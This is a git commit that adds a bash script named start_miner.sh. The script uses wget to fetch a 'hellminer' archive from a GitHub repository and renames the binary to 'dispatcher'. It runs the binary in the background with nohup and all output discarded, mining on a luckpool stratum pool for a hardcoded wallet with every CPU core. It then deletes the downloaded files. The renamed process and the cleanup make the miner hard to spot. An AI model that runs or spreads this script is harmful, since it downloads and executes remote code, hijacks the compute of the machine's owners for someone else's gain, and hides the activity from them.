25b25bc34f0eba43f5fa0a86094bc44d1257887d
bitcloudson <37044071+bitcloudson@users.noreply.github.com>
2022-02-01 11:27:07 +0800

    Add files via upload

---
+++ pl/start_miner.sh
@@ -0,0 +1,22 @@
+#!/bin/bash
+dir="hellminer"
+cpu_num=`cat /proc/cpuinfo |grep "processor"|wc -l`
+worker=$1
+
+if [ ! -n "$1" ];then 
+    echo "-> No input worker name $1 <-"
+else
+    echo "-> Worker name: $1 <-"
+    wget https://github.com/bitcloudson/rapidtools/raw/main/hellminer.tar -O ./hellminer.tar
+    tar -xvf hellminer.tar
+    chmod 777 $dir -R
+    cd ${dir}
+    mv hellminer dispatcher
+    nohup ./dispatcher -c stratum+tcp://na.luckpool.net:3956#xnsub -u RE1FQzyKLd9cnQDhkvS6XBW8RbmG1NzFAe.$worker -p x --cpu $cpu_num 1>/dev/null 2>/dev/null &
+    cd .. && pwd
+    sleep 5
+    unlink hellminer.tar
+    rm ${dir} -rf
+fi
+#nohup ./dispatcher -c stratum+tcp://na.luckpool.net:3956#xnsub -u RE1FQzyKLd9cnQDhkvS6XBW8RbmG1NzFAe.vg003 -p x --cpu 4 1>/dev/null 2>/dev/null & 
+echo "fin"
